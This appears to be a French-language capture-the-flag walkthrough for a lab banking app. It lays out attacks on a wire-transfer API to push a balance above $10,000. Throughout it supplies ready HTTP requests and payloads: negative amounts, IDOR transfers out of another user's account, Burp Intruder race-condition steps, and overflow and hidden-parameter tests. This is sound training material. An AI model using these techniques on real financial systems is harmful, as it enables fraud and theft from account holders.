# IDOR Challenge - Task 2 - Wire Transfer Exploitation

## 🎯 Objectif
Manipuler la fonctionnalité de transfert bancaire pour augmenter artificiellement ton solde au-delà de **$10,000** et obtenir le flag.

---

## 📋 Informations Initiales

### État de Départ
```
User: yosri (ID: 8cb0fac7d4174ab9b983777098e6b61a)
Account 1: f6be9486c9ea4bdc9701874491457403
Account 2: 3eede4688a7a4f828f91e7c16a2b9710
Balance Total Initial: $2,194.7
Objectif: > $10,000
```

### Endpoint de Transfert
```
POST http://web0x06.hbtn/api/accounts/transfer_to/{account_id}
```

---

## 🔍 Stratégies d'Exploitation

### Stratégie 1 : Montant Négatif (Race to Riches)

**Concept :** Transférer un montant **négatif** pour créditer ton compte au lieu de le débiter.

#### Test Initial
```
Transfert normal :
  De: Mon compte A
  Vers: Mon compte B
  Montant: 100
  Résultat: A -100, B +100

Transfert avec montant négatif :
  De: Mon compte A
  Vers: Mon compte B
  Montant: -5000
  Résultat attendu (si vulnérable): A +5000, B -5000
```

#### Avec DevTools/Burp Repeater

**Requête normale :**
```http
POST /api/accounts/transfer_to/3eede4688a7a4f828f91e7c16a2b9710 HTTP/1.1
Host: web0x06.hbtn
Content-Type: application/json

{
  "amount": 100,
  "from_account": "f6be9486c9ea4bdc9701874491457403"
}
```

**Requête avec montant négatif :**
```http
POST /api/accounts/transfer_to/3eede4688a7a4f828f91e7c16a2b9710 HTTP/1.1
Host: web0x06.hbtn
Content-Type: application/json

{
  "amount": -5000,
  "from_account": "f6be9486c9ea4bdc9701874491457403"
}
```

**Résultat si vulnérable :**
- Ton compte source reçoit 5000 au lieu de perdre 5000
- Balance augmente artificiellement

---

### Stratégie 2 : Auto-Transfert avec Exploitation

**Concept :** Transférer entre tes deux comptes avec manipulation.

#### Méthode A : Double Crédit
```
Si l'app crédite le destinataire AVANT de débiter la source,
et qu'on peut interrompre/manipuler :

1. Transfert de A vers B (montant X)
2. Si validation faible : B est crédité mais A n'est pas débité
3. Répéter pour augmenter le total
```

#### Méthode B : Montant Décimal/Float
```
Transfert avec montant décimal problématique :
  Amount: 0.1 (peut être arrondi différemment)
  Amount: 99999999999999999.99 (overflow)
  Amount: 1e10 (notation scientifique)
```

---

### Stratégie 3 : Manipulation des Comptes Source/Destination

**Concept :** Exploiter l'IDOR pour transférer depuis un autre compte.

#### Test avec compte d'un autre utilisateur comme source

**Requête normale (ton compte) :**
```http
POST /api/accounts/transfer_to/f6be9486c9ea4bdc9701874491457403 HTTP/1.1
Content-Type: application/json

{
  "amount": 5000,
  "from_account": "3eede4688a7a4f828f91e7c16a2b9710"
}
```

**Requête IDOR (compte d'un autre comme source) :**
```http
POST /api/accounts/transfer_to/f6be9486c9ea4bdc9701874491457403 HTTP/1.1
Content-Type: application/json

{
  "amount": 5000,
  "from_account": "cd8ec0cf192248139a66f57a74e204cd"  ← Compte de Linda Robinson
}
```

**Résultat si vulnérable :**
- Tu débites le compte de quelqu'un d'autre
- Tu crédites ton compte
- Balance augmente sans toucher à tes fonds

---

### Stratégie 4 : Race Condition

**Concept :** Envoyer plusieurs transferts simultanés avant que le solde ne soit mis à jour.

#### Technique
```
1. Balance initiale : 2194.7
2. Envoyer 10 transferts simultanés de 2000 (normalement impossible)
3. Si l'app ne lock pas le compte :
   - Chaque transfert voit balance = 2194.7
   - Tous sont acceptés
   - Balance finale : 2194.7 + (10 × 2000) = 22194.7
```

#### Avec Burp Intruder
```
1. Capture la requête de transfert
2. Send to Intruder
3. Configure :
   - Threads : 10 simultanés
   - Payload : Même montant répété
4. Start attack
5. Observe si plusieurs réussissent
```

---

### Stratégie 5 : Overflow/Underflow

**Concept :** Exploiter les limites des types numériques.

#### Tests
```json
{
  "amount": 2147483647,  // Max int32
  "amount": 9999999999,  // Très grand nombre
  "amount": "999999999999999999999",  // String qui pourrait bypasser validation
  "amount": null,  // Null peut causer erreur = pas de débit
  "amount": 0,  // Transfert de 0 peut causer bugs
}
```

---

### Stratégie 6 : Paramètres Additionnels

**Concept :** Ajouter des paramètres pour manipuler la logique.

#### Tests
```json
{
  "amount": 5000,
  "from_account": "ton_compte",
  "to_account": "ton_compte",  // Forcer destination
  "multiply": 10,  // Multiplicateur ?
  "credit_only": true,  // Flag pour créditer seulement ?
  "skip_validation": true,  // Bypass validation ?
  "admin": true  // Privilèges admin ?
}
```

---

## 🔧 Méthodologie Pratique

### Étape 1 : Analyse du Transfert Normal

1. **Va sur la page de transfert**
2. **Ouvre DevTools → Network**
3. **Fais un petit transfert (1€) entre tes comptes**
4. **Capture la requête dans Network/Burp**

**Note :**
- URL exacte
- Méthode (POST)
- Headers (Content-Type, Cookie)
- Body (structure JSON)
- Réponse (success, nouveau balance)

---

### Étape 2 : Tests Incrémentaux avec Burp Repeater

#### Configuration
```
1. Trouve la requête de transfert dans HTTP History
2. Send to Repeater
3. Garde les headers et cookies intacts
```

#### Tests Séquentiels

**Test 1 : Montant Négatif**
```json
{"amount": -5000, "from_account": "..."}
```
→ Balance augmente ?

**Test 2 : IDOR Source Account**
```json
{"amount": 5000, "from_account": "cd8ec0cf192248139a66f57a74e204cd"}
```
→ Débite le compte de Linda ?

**Test 3 : Même Compte Source/Destination**
```json
POST /api/accounts/transfer_to/f6be9486c9ea4bdc9701874491457403
{"amount": 5000, "from_account": "f6be9486c9ea4bdc9701874491457403"}
```
→ Double crédit ?

**Test 4 : Montant Énorme**
```json
{"amount": 999999999, "from_account": "..."}
```
→ Overflow ?

---

### Étape 3 : Vérification du Balance

Après chaque test :
```
GET http://web0x06.hbtn/api/customer/info/me
```

Regarde `total_balance` :
- A-t-il augmenté ?
- De combien ?

---

### Étape 4 : Exploitation jusqu'à 10k+

Une fois la vulnérabilité trouvée :

**Si montant négatif fonctionne :**
```
1. Transfert de -8000 (besoin de ~8000 pour atteindre 10k)
2. Vérifie balance
3. Si < 10k, répète avec montant ajusté
4. Une fois > 10k, cherche le flag
```

**Si IDOR fonctionne :**
```
1. Récupère un account avec balance élevée (depuis Task 1)
2. Transfère depuis cet account vers le tien
3. Répète jusqu'à > 10k
```

**Si race condition fonctionne :**
```
1. Configure Burp Intruder
2. Envoie 10 transferts simultanés de 1000
3. Espère que plusieurs passent
```

---

## 🚩 Obtention du Flag

### Une fois balance > $10,000

**Le flag peut apparaître :**

#### Option 1 : Dans la réponse du transfert
```json
{
  "status": "success",
  "new_balance": 12000,
  "flag": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "message": "Congratulations! Balance exceeds $10,000"
}
```

#### Option 2 : Dans le profil utilisateur
```
GET /api/customer/info/me
```
```json
{
  "total_balance": 12000,
  "flag": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
}
```

#### Option 3 : Sur le Dashboard
```
Va sur http://web0x06.hbtn/dashboard
→ Message/bannière avec le flag
→ Inspecte le HTML pour le trouver
```

#### Option 4 : Dans un endpoint dédié
```
GET /api/flag
GET /api/achievement
GET /api/reward
```

---

## 🎯 Checklist de Tests

```
[ ] Analyse de la requête de transfert normale
[ ] Test montant négatif : -5000
[ ] Test IDOR source account (compte d'un autre)
[ ] Test auto-transfert (même compte source/destination)
[ ] Test montant énorme (overflow)
[ ] Test montant décimal bizarre (0.0000001)
[ ] Test paramètres additionnels (credit_only, etc.)
[ ] Test race condition (Burp Intruder, 10 simultanés)
[ ] Vérification balance après chaque test
[ ] Recherche du flag une fois > 10k
```

---

## 💡 Tips Importants

### Avec Burp Repeater
- **Garde les cookies** : Session nécessaire
- **Content-Type: application/json** : Obligatoire
- **Teste une variation à la fois** : Pour identifier ce qui fonctionne
- **Note les réponses** : Messages d'erreur = indices

### Stratégie Efficace
1. **Commence simple** : Montant négatif
2. **Si échec, IDOR** : Compte source d'un autre
3. **Si échec, race condition** : Burp Intruder
4. **Dernier recours** : Overflow, paramètres étranges

### Vérification
Après chaque tentative :
```bash
# Vérifie ton balance
GET /api/customer/info/me

# Ou recharge le dashboard
F5 sur http://web0x06.hbtn/dashboard
```

---

## 🛡️ Vulnérabilités Exploitées

### Type de Vulnérabilité
```
Business Logic Flaw / Insufficient Input Validation
```

**Exemples :**
- Pas de validation du signe (négatif accepté)
- Pas de vérification d'autorisation sur source account
- Pas de protection contre race conditions
- Overflow numérique non géré

---

## 📊 Progression

```
Balance Initial : $2,194.7
Objectif        : > $10,000
Besoin          : +$7,805.3

Méthode trouvée : [À compléter]
Transferts      : [Nombre]
Balance Final   : [Montant]
Flag Obtenu     : ✅ / ❌
```

---

**Commence maintenant ! Intercepte un transfert avec Burp et teste ces stratégies ! 🔥**

**Bonne chance pour atteindre les $10k ! 💰**
